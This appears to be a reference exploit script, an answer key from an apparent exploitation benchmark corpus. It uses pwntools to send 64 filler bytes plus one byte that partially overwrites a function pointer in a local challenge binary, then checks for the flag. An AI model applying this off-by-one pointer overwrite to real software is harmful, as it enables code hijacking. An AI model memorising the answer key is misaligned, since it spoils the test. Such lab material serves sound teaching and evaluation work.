#!/usr/bin/env python3
"""Hand-verified reference exploit for corpus_r2/13_off_by_one_retaddr_lsb.

Technique: a classic fencepost off-by-one (`n < sizeof(s.buf) + 1` instead
of `n < sizeof(s.buf)`) lets the read loop write exactly one byte past
`s.buf[63]`, landing on the LOWEST-order byte of `s.cb` (a function pointer
declared immediately after `buf` in the same struct -- guaranteed adjacent
by the C standard's ascending-declaration-order layout rule).

`safe_path` (0x401256) and `win` (0x4012f8) share every byte except the
lowest one (both live in the same 0x401200-aligned region), so overwriting
only that single LSB with win's low byte (0xf8) turns the struct's
`s.cb = safe_path` initializer into `win`'s real address with a ONE-BYTE
write -- no full 8-byte pointer needs to be smuggled in.

`s.cb()` is invoked via a genuine indirect `call` instruction (not a
ret-based hijack), so no ABI stack-alignment fixup is required here.

Necessity: 64 bytes of input (not reaching the fencepost byte) leaves
`s.cb` untouched and safe_path() runs instead -- see ablation.py's
"exactly sizeof(buf) bytes" case.
"""
import os
import sys

from pwn import ELF, context, process

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "corpus_r2", "13_off_by_one_retaddr_lsb",
                    "off_by_one_retaddr_lsb")

context.log_level = "error"
context.arch = "amd64"


def main():
    elf = ELF(BIN, checksec=False)
    win_lsb = elf.symbols["win"] & 0xFF

    io = process(BIN, cwd=os.path.dirname(BIN))
    io.recvuntil(b"data (no newline): ")

    payload = b"A" * 64 + bytes([win_lsb])  # 65th byte: the fencepost overflow
    io.send(payload)

    out = io.recvall(timeout=3).decode(errors="replace")
    io.close()

    flag_file = os.path.join(HERE, "..", "corpus_r2", "13_off_by_one_retaddr_lsb",
                              "flag.txt")
    with open(flag_file) as f:
        expected = f.read().strip()

    if expected in out:
        print(f"[+] PASS: flag recovered: {expected}")
        return 0
    print("[-] FAIL: flag not found in output")
    print(out)
    return 1


if __name__ == "__main__":
    sys.exit(main())
